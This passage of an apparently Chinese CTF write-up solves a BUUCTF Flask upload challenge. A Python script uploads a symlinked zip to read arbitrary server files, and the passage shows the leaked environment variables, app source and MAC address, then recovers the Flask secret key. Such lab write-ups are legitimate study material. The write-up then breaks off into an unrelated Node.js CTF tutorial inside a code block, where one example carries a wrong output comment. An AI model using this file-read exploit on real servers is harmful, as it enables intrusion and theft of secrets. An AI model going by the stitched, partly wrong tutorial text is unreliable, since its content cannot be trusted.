class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#coding=utf-8</span></span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"></span><br><span class="line">url = <span class="string">&#x27;http://276bbd4d-16c0-428b-9bda-462c941d026f.node5.buuoj.cn/upload&#x27;</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">makezip</span>():</span><br><span class="line">    os.system(<span class="string">&#x27;ln -s &#x27;</span>+sys.argv[<span class="number">1</span>]+<span class="string">&#x27; exp&#x27;</span>)</span><br><span class="line">    os.system(<span class="string">&#x27;zip --symlinks exp.zip exp&#x27;</span>)</span><br><span class="line">makezip()</span><br><span class="line"></span><br><span class="line">files = &#123;<span class="string">&#x27;the_file&#x27;</span>:<span class="built_in">open</span>(<span class="string">&#x27;./exp.zip&#x27;</span>,<span class="string">&#x27;rb&#x27;</span>)&#125;</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">exploit</span>():</span><br><span class="line">    res = requests.post(url,files=files)</span><br><span class="line">    <span class="built_in">print</span>(res.text)</span><br><span class="line"></span><br><span class="line">exploit()</span><br><span class="line">os.system(<span class="string">&#x27;rm -rf exp&#x27;</span>)</span><br><span class="line">os.system(<span class="string">&#x27;rm -rf exp.zip&#x27;</span>)</span><br></pre></td></tr></table></figure><p>访问Linux的<code>/proc/self/environ</code>文件，它存放着环境变量，也就包括<code>flask</code>下的环境变量</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">[root@CentOs softlink]<span class="comment"># python3 exp.py /proc/self/environ</span></span><br><span class="line">/usr/local/lib/python3.6/site-packages/requests/__init__.py:104: RequestsDependencyWarning: urllib3 (1.26.16) or chardet (5.0.0)/charset_normalizer (2.0.12) doesn<span class="string">&#x27;t match a supported version!</span></span><br><span class="line"><span class="string">  RequestsDependencyWarning)</span></span><br><span class="line"><span class="string">  adding: exp (stored 0%)</span></span><br><span class="line"><span class="string">KUBERNETES_PORT=tcp://10.240.0.1:443KUBERNETES_SERVICE_PORT=443HOSTNAME=outSHLVL=1PYTHON_PIP_VERSION=19.1.1HOME=/rootGPG_KEY=0D96DF4D4110E5C43FBFB17F2D347EA6AA65421DUWSGI_INI=/app/uwsgi.iniWERKZEUG_SERVER_FD=3NGINX_MAX_UPLOAD=0UWSGI_PROCESSES=16STATIC_URL=/static_=/usr/local/bin/pythonUWSGI_CHEAPER=2WERKZEUG_RUN_MAIN=trueNGINX_VERSION=1.15.8-1~stretchKUBERNETES_PORT_443_TCP_ADDR=10.240.0.1PATH=/usr/local/bin:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/binNJS_VERSION=1.15.8.0.2.7-1~stretchKUBERNETES_PORT_443_TCP_PORT=443KUBERNETES_PORT_443_TCP_PROTO=tcpLANG=C.UTF-8PYTHON_VERSION=3.6.8KUBERNETES_SERVICE_PORT_HTTPS=443NGINX_WORKER_PROCESSES=1KUBERNETES_PORT_443_TCP=tcp://10.240.0.1:443LISTEN_PORT=80STATIC_INDEX=0PWD=/appKUBERNETES_SERVICE_HOST=10.240.0.1PYTHONPATH=/appSTATIC_PATH=/app/staticFLAG=not_flag</span></span><br></pre></td></tr></table></figure><p>给了<code>/app/uwsgi.ini</code>，而这个文件是<code>uwsgi.ini</code>配置文件，这里学习到这是<strong>uwsgi</strong>服务器的配置文件，其中可能包含有源码路径，生产上一般使用<code>client —&gt; nginx —&gt; uwsgi --&gt; flask后台程序</code>的流程，读取其内容</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">[uwsgi]</span><br><span class="line">module = main</span><br><span class="line">callable=app</span><br><span class="line">logto = /tmp/hard_t0_guess_n9p2i5a6d1s_uwsgi.log</span><br></pre></td></tr></table></figure><p>由于buu环境配置问题导致此处源码路径错误，在网上找到正确的的源码路径读取</p><p><code>python3 exp.py /app/hard_t0_guess_n9f5a95b5ku9fg/hard_t0_guess_also_df45v48ytj9_main.py</code></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> Flask,session,render_template,redirect, url_for, escape, request,Response</span><br><span class="line"><span class="keyword">import</span> uuid</span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"><span class="keyword">import</span> random</span><br><span class="line"><span class="keyword">import</span> flag</span><br><span class="line"><span class="keyword">from</span> werkzeug.utils <span class="keyword">import</span> secure_filename</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line">random.seed(uuid.getnode())</span><br><span class="line">app = Flask(__name__)</span><br><span class="line">app.config[<span class="string">&#x27;SECRET_KEY&#x27;</span>] = <span class="built_in">str</span>(random.random()*<span class="number">100</span>)</span><br><span class="line">app.config[<span class="string">&#x27;UPLOAD_FOLDER&#x27;</span>] = <span class="string">&#x27;./uploads&#x27;</span></span><br><span class="line">app.config[<span class="string">&#x27;MAX_CONTENT_LENGTH&#x27;</span>] = <span class="number">100</span> * <span class="number">1024</span></span><br><span class="line">ALLOWED_EXTENSIONS = <span class="built_in">set</span>([<span class="string">&#x27;zip&#x27;</span>])</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">allowed_file</span>(<span class="params">filename</span>):</span><br><span class="line">    <span class="keyword">return</span> <span class="string">&#x27;.&#x27;</span> <span class="keyword">in</span> filename <span class="keyword">and</span> \</span><br><span class="line">           filename.rsplit(<span class="string">&#x27;.&#x27;</span>, <span class="number">1</span>)[<span class="number">1</span>].lower() <span class="keyword">in</span> ALLOWED_EXTENSIONS</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/&#x27;</span>, methods=[<span class="string">&#x27;GET&#x27;</span>]</span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">index</span>():</span><br><span class="line">    error = request.args.get(<span class="string">&#x27;error&#x27;</span>, <span class="string">&#x27;&#x27;</span>)</span><br><span class="line">    <span class="keyword">if</span>(error == <span class="string">&#x27;1&#x27;</span>):</span><br><span class="line">        session.pop(<span class="string">&#x27;username&#x27;</span>, <span class="literal">None</span>)</span><br><span class="line">        <span class="keyword">return</span> render_template(<span class="string">&#x27;index.html&#x27;</span>, forbidden=<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> <span class="string">&#x27;username&#x27;</span> <span class="keyword">in</span> session:</span><br><span class="line">        <span class="keyword">return</span> render_template(<span class="string">&#x27;index.html&#x27;</span>, user=session[<span class="string">&#x27;username&#x27;</span>], flag=flag.flag)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">return</span> render_template(<span class="string">&#x27;index.html&#x27;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/login&#x27;</span>, methods=[<span class="string">&#x27;POST&#x27;</span>]</span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">login</span>():</span><br><span class="line">    username=request.form[<span class="string">&#x27;username&#x27;</span>]</span><br><span class="line">    password=request.form[<span class="string">&#x27;password&#x27;</span>]</span><br><span class="line">    <span class="keyword">if</span> request.method == <span class="string">&#x27;POST&#x27;</span> <span class="keyword">and</span> username != <span class="string">&#x27;&#x27;</span> <span class="keyword">and</span> password != <span class="string">&#x27;&#x27;</span>:</span><br><span class="line">        <span class="keyword">if</span>(username == <span class="string">&#x27;admin&#x27;</span>):</span><br><span class="line">            <span class="keyword">return</span> redirect(url_for(<span class="string">&#x27;index&#x27;</span>,error=<span class="number">1</span>))</span><br><span class="line">        session[<span class="string">&#x27;username&#x27;</span>] = username</span><br><span class="line">    <span class="keyword">return</span> redirect(url_for(<span class="string">&#x27;index&#x27;</span>))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/logout&#x27;</span>, methods=[<span class="string">&#x27;GET&#x27;</span>]</span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">logout</span>():</span><br><span class="line">    session.pop(<span class="string">&#x27;username&#x27;</span>, <span class="literal">None</span>)</span><br><span class="line">    <span class="keyword">return</span> redirect(url_for(<span class="string">&#x27;index&#x27;</span>))</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/upload&#x27;</span>, methods=[<span class="string">&#x27;POST&#x27;</span>]</span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">upload_file</span>():</span><br><span class="line">    <span class="keyword">if</span> <span class="string">&#x27;the_file&#x27;</span> <span class="keyword">not</span> <span class="keyword">in</span> request.files:</span><br><span class="line">        <span class="keyword">return</span> redirect(url_for(<span class="string">&#x27;index&#x27;</span>))</span><br><span class="line">    file = request.files[<span class="string">&#x27;the_file&#x27;</span>]</span><br><span class="line">    <span class="keyword">if</span> file.filename == <span class="string">&#x27;&#x27;</span>:</span><br><span class="line">        <span class="keyword">return</span> redirect(url_for(<span class="string">&#x27;index&#x27;</span>))</span><br><span class="line">    <span class="keyword">if</span> file <span class="keyword">and</span> allowed_file(file.filename):</span><br><span class="line">        filename = secure_filename(file.filename)</span><br><span class="line">        file_save_path = os.path.join(app.config[<span class="string">&#x27;UPLOAD_FOLDER&#x27;</span>], filename)</span><br><span class="line">        <span class="keyword">if</span>(os.path.exists(file_save_path)):</span><br><span class="line">            <span class="keyword">return</span> <span class="string">&#x27;This file already exists&#x27;</span></span><br><span class="line">        file.save(file_save_path)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&#x27;This file is not a zipfile&#x27;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        extract_path = file_save_path + <span class="string">&#x27;_&#x27;</span></span><br><span class="line">        os.system(<span class="string">&#x27;unzip -n &#x27;</span> + file_save_path + <span class="string">&#x27; -d &#x27;</span>+ extract_path)</span><br><span class="line">        read_obj = os.popen(<span class="string">&#x27;cat &#x27;</span> + extract_path + <span class="string">&#x27;/*&#x27;</span>)</span><br><span class="line">        file = read_obj.read()</span><br><span class="line">        read_obj.close()</span><br><span class="line">        os.system(<span class="string">&#x27;rm -rf &#x27;</span> + extract_path)</span><br><span class="line">    <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">        file = <span class="literal">None</span></span><br><span class="line"></span><br><span class="line">    os.remove(file_save_path)</span><br><span class="line">    <span class="keyword">if</span>(file != <span class="literal">None</span>):</span><br><span class="line">        <span class="keyword">if</span>(file.find(base64.b64decode(<span class="string">&#x27;aGN0Zg==&#x27;</span>).decode(<span class="string">&#x27;utf-8&#x27;</span>)) != -<span class="number">1</span>):</span><br><span class="line">            <span class="keyword">return</span> redirect(url_for(<span class="string">&#x27;index&#x27;</span>, error=<span class="number">1</span>))</span><br><span class="line">    <span class="keyword">return</span> Response(file)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    <span class="comment">#app.run(debug=True)</span></span><br><span class="line">    app.run(host=<span class="string">&#x27;0.0.0.0&#x27;</span>, debug=<span class="literal">True</span>, port=<span class="number">10008</span>)</span><br></pre></td></tr></table></figure><p><code>app.config['SECRET_KEY'] = str(random.random()*100)</code>这里的密钥是随机生成的，但是给了种子<code>random.seed(uuid.getnode())</code>，我们知道这个<code>random</code>是著名的伪随机数，我们只要知道播了的种子就能够生成和它产生一样的随机数</p><p><img src="https://s2.loli.net/2024/05/17/lxAfMJGUFPK2swS.png" alt="seed"></p><p>发现<code>uuid.getnode()</code>的作用为返回Mac地址的十进制，类似算PIN时，搭配文件读取即可获得</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">python3 exp.py /sys/class/net/eth0/address</span><br><span class="line">ae:bd:94:bf:71:e9</span><br></pre></td></tr></table></figure><p><img src="https://s2.loli.net/2024/05/17/Eiy48H6hAfIWljb.png" alt="calc"></p><p>将其转化为十进制，本地运行得到<code>key</code></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#coding=utf-8</span></span><br><span class="line"><span class="keyword">import</span> random</span><br><span class="line"></span><br><span class="line">seed = <span class="number">192129267626473</span></span><br><span class="line">random.seed(seed)</span><br><span class="line">secret_key = <span class="built_in">str</span>(random.random()*<span class="number">100</span>)</span><br><span class="line"><span class="built_in">print</span>(secret_key)</span><br><span class="line"><span class="comment"># 41.64679886573448</span></span><br></pre></td></tr></table></figure><p><img src="https://s2.loli.net/2024/05/17/qKxoUalpFGCmbyj.png" alt="ceb0db1d3ce504ff554de9f5f0577952"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br><span class="line">241</span><br><span class="line">242</span><br><span class="line">243</span><br><span class="line">244</span><br><span class="line">245</span><br><span class="line">246</span><br><span class="line">247</span><br><span class="line">248</span><br><span class="line">249</span><br><span class="line">250</span><br><span class="line">251</span><br><span class="line">252</span><br><span class="line">253</span><br><span class="line">254</span><br><span class="line">255</span><br><span class="line">256</span><br><span class="line">257</span><br><span class="line">258</span><br><span class="line">259</span><br><span class="line">260</span><br><span class="line">261</span><br><span class="line">262</span><br><span class="line">263</span><br><span class="line">264</span><br><span class="line">265</span><br><span class="line">266</span><br><span class="line">267</span><br><span class="line">268</span><br><span class="line">269</span><br><span class="line">270</span><br><span class="line">271</span><br><span class="line">272</span><br><span class="line">273</span><br><span class="line">274</span><br><span class="line">275</span><br><span class="line">276</span><br><span class="line">277</span><br><span class="line">278</span><br><span class="line">279</span><br><span class="line">280</span><br><span class="line">281</span><br><span class="line">282</span><br><span class="line">283</span><br><span class="line">284</span><br><span class="line">285</span><br><span class="line">286</span><br><span class="line">287</span><br><span class="line">288</span><br><span class="line">289</span><br><span class="line">290</span><br><span class="line">291</span><br><span class="line">292</span><br><span class="line">293</span><br><span class="line">294</span><br><span class="line">295</span><br><span class="line">296</span><br><span class="line">297</span><br><span class="line">298</span><br><span class="line">299</span><br><span class="line">300</span><br><span class="line">301</span><br><span class="line">302</span><br><span class="line">303</span><br><span class="line">304</span><br><span class="line">305</span><br><span class="line">306</span><br><span class="line">307</span><br><span class="line">308</span><br><span class="line">309</span><br><span class="line">310</span><br><span class="line">311</span><br><span class="line">312</span><br><span class="line">313</span><br><span class="line">314</span><br><span class="line">315</span><br><span class="line">316</span><br><span class="line">317</span><br><span class="line">318</span><br><span class="line">319</span><br><span class="line">320</span><br><span class="line">321</span><br><span class="line">322</span><br><span class="line">323</span><br><span class="line">324</span><br><span class="line">325</span><br><span class="line">326</span><br><span class="line">327</span><br><span class="line">328</span><br><span class="line">329</span><br><span class="line">330</span><br><span class="line">331</span><br><span class="line">332</span><br><span class="line">333</span><br><span class="line">334</span><br><span class="line">335</span><br><span class="line">336</span><br><span class="line">337</span><br><span class="line">338</span><br><span class="line">339</span><br><span class="line">340</span><br><span class="line">341</span><br><span class="line">342</span><br><span class="line">343</span><br><span class="line">344</span><br><span class="line">345</span><br><span class="line">346</span><br><span class="line">347</span><br><span class="line">348</span><br><span class="line">349</span><br><span class="line">350</span><br><span class="line">351</span><br><span class="line">352</span><br><span class="line">353</span><br><span class="line">354</span><br><span class="line">355</span><br><span class="line">356</span><br><span class="line">357</span><br><span class="line">358</span><br><span class="line">359</span><br><span class="line">360</span><br><span class="line">361</span><br><span class="line">362</span><br><span class="line">363</span><br><span class="line">364</span><br><span class="line">365</span><br><span class="line">366</span><br><span class="line">367</span><br><span class="line">368</span><br><span class="line">369</span><br><span class="line">370</span><br><span class="line">371</span><br><span class="line">372</span><br><span class="line">373</span><br><span class="line">374</span><br><span class="line">375</span><br><span class="line">376</span><br><span class="line">377</span><br><span class="line">378</span><br><span class="line">379</span><br><span class="line">380</span><br><span class="line">381</span><br><span class="line">382</span><br><span class="line">383</span><br><span class="line">384</span><br><span class="line">385</span><br><span class="line">386</span><br><span class="line">387</span><br><span class="line">388</span><br><span class="line">389</span><br><span class="line">390</span><br><span class="line">391</span><br><span class="line">392</span><br><span class="line">393</span><br><span class="line">394</span><br><span class="line">395</span><br><span class="line">396</span><br><span class="line">397</span><br><span class="line">398</span><br><span class="line">399</span><br><span class="line">400</span><br><span class="line">401</span><br><span class="line">402</span><br><span class="line">403</span><br><span class="line">404</span><br><span class="line">405</span><br><span class="line">406</span><br><span class="line">407</span><br><span class="line">408</span><br><span class="line">409</span><br><span class="line">410</span><br><span class="line">411</span><br><span class="line">412</span><br><span class="line">413</span><br><span class="line">414</span><br><span class="line">415</span><br><span class="line">416</span><br><span class="line">417</span><br><span class="line">418</span><br><span class="line">419</span><br><span class="line">420</span><br><span class="line">421</span><br><span class="line">422</span><br><span class="line">423</span><br><span class="line">424</span><br><span class="line">425</span><br><span class="line">426</span><br><span class="line">427</span><br><span class="line">428</span><br><span class="line">429</span><br><span class="line">430</span><br><span class="line">431</span><br><span class="line">432</span><br><span class="line">433</span><br><span class="line">434</span><br><span class="line">435</span><br><span class="line">436</span><br><span class="line">437</span><br><span class="line">438</span><br><span class="line">439</span><br><span class="line">440</span><br><span class="line">441</span><br><span class="line">442</span><br><span class="line">443</span><br><span class="line">444</span><br><span class="line">445</span><br><span class="line">446</span><br><span class="line">447</span><br><span class="line">448</span><br><span class="line">449</span><br></pre></td><td class="code"><pre><span class="line">我也是非常有幸能为大家去讲解CTF中nodejs的一些小知识，关于ctf-web系列课程已经在bilibili陆续发布 https://www.bilibili.com/video/BV1uL411P7xt/ ，大家在有什么疑问可以随时在评论区留言哦~</span><br><span class="line"></span><br><span class="line">1 nodejs基础</span><br><span class="line">1.1 nodejs的简单介绍</span><br><span class="line">简单的说 Node.js 就是运行在服务端的 JavaScript。</span><br><span class="line">Node.js 是一个基于Chrome JavaScript 运行时建立的一个平台。</span><br><span class="line">Node.js是一个事件驱动I/O服务端JavaScript环境，基于Google的V8引擎，V8引擎执行Javascript的速度非常快，性能非常好。</span><br><span class="line"></span><br><span class="line">nodejs语法学习</span><br><span class="line"></span><br><span class="line">1.2 nodejs语言的缺点</span><br><span class="line">1.2.1 大小写特性</span><br><span class="line">toUpperCase()</span><br><span class="line">toLowerCase()</span><br><span class="line"></span><br><span class="line">对于toUpperCase(): 字符&quot;ı&quot;、&quot;ſ&quot; 经过toUpperCase处理后结果为 &quot;I&quot;、&quot;S&quot;</span><br><span class="line">对于toLowerCase(): 字符&quot;K&quot;经过toLowerCase处理后结果为&quot;k&quot;(这个K不是K)</span><br><span class="line"></span><br><span class="line">1.2.2 弱类型比较</span><br><span class="line">大小比较</span><br><span class="line"></span><br><span class="line">js</span><br><span class="line">console.log(1==&#x27;1&#x27;); //true </span><br><span class="line">console.log(1&gt;&#x27;2&#x27;); //false </span><br><span class="line">console.log(&#x27;1&#x27;&lt;&#x27;2&#x27;); //true </span><br><span class="line">console.log(111&gt;&#x27;3&#x27;); //true </span><br><span class="line">console.log(&#x27;111&#x27;&gt;&#x27;3&#x27;); //false </span><br><span class="line">console.log(&#x27;asd&#x27;&gt;1); //false</span><br><span class="line">总结：数字与字符串比较时，会优先将纯数字型字符串转为数字之后再进行比较；而字符串与字符串比较时，会将字符串的第一个字符转为ASCII码之后再进行比较，因此就会出现第五行代码的这种情况；而非数字型字符串与任何数字进行比较都是false</span><br><span class="line"></span><br><span class="line">数组的比较：</span><br><span class="line"></span><br><span class="line">js</span><br><span class="line">console.log([]==[]); //false </span><br><span class="line">console.log([]&gt;[]); //false</span><br><span class="line">console.log([6,2]&gt;[5]); //true </span><br><span class="line">console.log([100,2]&lt;&#x27;test&#x27;); //true </span><br><span class="line">console.log([1,2]&lt;&#x27;2&#x27;);  //true </span><br><span class="line">console.log([11,16]&lt;&quot;10&quot;); //false</span><br><span class="line">总结：空数组之间比较永远为false，数组之间比较只比较数组间的第一个值，对第一个值采用前面总结的比较方法，数组与非数值型字符串比较，数组永远小于非数值型字符串；数组与数值型字符串比较，取第一个之后按前面总结的方法进行比较</span><br><span class="line"></span><br><span class="line">还有一些比较特别的相等：</span><br><span class="line"></span><br><span class="line">js</span><br><span class="line">console.log(null==undefined) // 输出：true </span><br><span class="line">console.log(null===undefined) // 输出：false </span><br><span class="line">console.log(NaN==NaN)  // 输出：false </span><br><span class="line">console.log(NaN===NaN)  // 输出：false</span><br><span class="line">变量拼接</span><br><span class="line"></span><br><span class="line">js</span><br><span class="line">console.log(5+[6,6]); //56,3 </span><br><span class="line">console.log(&quot;5&quot;+6); //56 </span><br><span class="line">console.log(&quot;5&quot;+[6,6]); //56,6 </span><br><span class="line">console.log(&quot;5&quot;+[&quot;6&quot;,&quot;6&quot;]); //56,6</span><br><span class="line">1.2.3 MD5的绕过</span><br><span class="line">js</span><br><span class="line">a &amp;&amp; b &amp;&amp; a.length===b.length &amp;&amp; a!==b &amp;&amp; md5(a+flag)===md5(b+flag)</span><br><span class="line">a[x]=1&amp;b[x]=2</span><br><span class="line"></span><br><span class="line">数组会被解析成[object Object]</span><br><span class="line"></span><br><span class="line">js</span><br><span class="line">a=&#123;&#x27;x&#x27;:&#x27;1&#x27;&#125;</span><br><span class="line">b=&#123;&#x27;x&#x27;:&#x27;2&#x27;&#125;</span><br><span class="line"></span><br><span class="line">console.log(a+&quot;flag&#123;xxx&#125;&quot;)</span><br><span class="line">console.log(b+&quot;flag&#123;xxx&#125;&quot;)</span><br><span class="line"></span><br><span class="line">a=[1]</span><br><span class="line">b=[2]</span><br><span class="line"></span><br><span class="line">console.log(a+&quot;flag&#123;xxx&#125;&quot;)</span><br><span class="line">console.log(b+&quot;flag&#123;xxx&#125;&quot;)</span><br><span class="line">1.2.4 编码绕过</span><br><span class="line">16进制编码</span><br><span class="line"></span><br><span class="line">js</span><br><span 